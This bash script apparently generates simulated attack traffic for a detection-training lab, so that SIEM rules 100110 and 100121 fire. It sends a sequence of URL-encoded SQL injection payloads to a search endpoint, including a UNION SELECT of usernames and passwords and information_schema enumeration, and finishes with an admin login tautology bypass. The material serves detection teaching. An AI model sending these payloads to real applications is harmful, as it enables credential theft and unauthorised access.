#!/usr/bin/env bash
# Attack (rule 100110): SQL injection on search (data theft) and login (auth bypass). A browser
# user-agent, not sqlmap. A realistic progression: a probe, error-based confirmation, column
# discovery, then a UNION extraction against the users table — every payload sits in the URL, which
# is what rule 100110 matches (ignore=60 collapses the burst into one case). The final login
# tautology authenticates as admin from the external attacker IP, logging a real authresult=success
# that is actually an attack (the 100121 teaching nuance: a success from a flagged IP is not benign).
set -euo pipefail
source "$(dirname "$0")/_lib.sh"
ip="$(rand_attacker_ip)"
ua="$(pick 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128.0' 'python-requests/2.31')"
echo "SQL injection from ${ip}"
# 1) Probe + error-based confirmation on search.
payloads=(
  "x%27"                                                              # break the quote
  "x%27%20OR%201%3D1--"                                              # tautology
  "x%27%20AND%201%3D2--"                                            # false, for diffing
  "x%27%20ORDER%20BY%201--"                                         # column discovery
  "x%27%20ORDER%20BY%208--"
  "%27%20UNION%20SELECT%20NULL%2CNULL--"                            # column count
  "%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--"      # the grab
  "%27%20UNION%20SELECT%20table_name%2CNULL%20FROM%20information_schema.tables--"
  "%27%20UNION%20SELECT%20column_name%2CNULL%20FROM%20information_schema.columns--"
)
for p in "${payloads[@]}"; do hit GET "/search?q=${p}" "$ip" "$ua"; done
# 2) Auth bypass on login: tautology authenticates without a password (logs authresult=success).
hit POST "/login" "$ip" "$ua" \
  --data-urlencode "username=admin' OR '1'='1" --data-urlencode "password=x"
